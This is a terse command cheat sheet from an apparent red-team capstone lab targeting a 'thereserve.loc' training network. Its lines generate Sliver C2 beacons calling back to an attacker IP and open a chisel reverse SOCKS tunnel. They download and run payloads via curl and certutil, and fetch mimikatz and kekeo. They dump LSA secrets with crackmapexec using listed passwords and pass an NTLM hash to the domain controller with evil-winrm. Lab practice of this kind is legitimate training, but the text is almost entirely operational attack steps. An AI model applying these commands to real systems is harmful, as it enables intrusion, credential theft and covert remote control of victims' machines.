...
```bash
sudo sed -i 's/.119./.119./g' /etc/hosts
sed 's/.119./.119./g' -i internalHosts.txt
...
sed 's/.119./.119./g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
```
...
echo "10.200.119.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.119.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.119.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.119.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.119.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.119.31 SERVER01.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.119.32 SERVER02.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.119.102 CORPDC.corp.thereserve.loc " | sudo tee -a /etc/hosts
```
...
nohup ./chisel client 10.50.116.126:20000 R:127.0.0.1:20002:socks &
...
New
```bash
# https://stackoverflow.com/questions/711.119.bash-history-without-line-numbers
history | cut -c 8-
```
...
# Linux VPN
generate beacon --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN/VPN-update
# WRK01
generate beacon -m 10.50.116.126:11012 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin
# Serv0 foothold
generate beacon -m 10.50.116.126:11013 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/Server01.bin
# DC foothold
generate beacon -m 10.50.116.126:11014 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/DC1/Backup.bin
...
# permissions
sudo chown -R kali:kali * && chmod -R +x *
...
# Tools
# As root
curl http://10.50.116.126:8443/VPN/VPN-update -o VPN-update
nohup ./VPN-update &
chmod +x *
...
# Download Word.exe 
# open powershell 
proxychains4 crackmapexec smb 10.200.119.31 -u 'svcScanning' -p 'Password1!'
proxychains4 crackmapexec smb 10.200.119.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --pass-pol
proxychains4 crackmapexec smb 10.200.119.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --lsa
...
# Or
proxychains4 evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.119.102
...
# Beacon Drop 
# Either
certutil.exe -urlcache -split -f http://10.50.116.126:8443/DC1/cmd.exe cmd.exe
# Share
...
# Either
certutil.exe -urlcache -split -f http://10.50.116.126:8443/Tools/PowerView/PowerView.ps1
certutil.exe -urlcache -split -f http://10.50.116.126:8443/mimikatz.zip
certutil.exe -urlcache -split -f http://10.50.116.126:8443/kekeo.zip
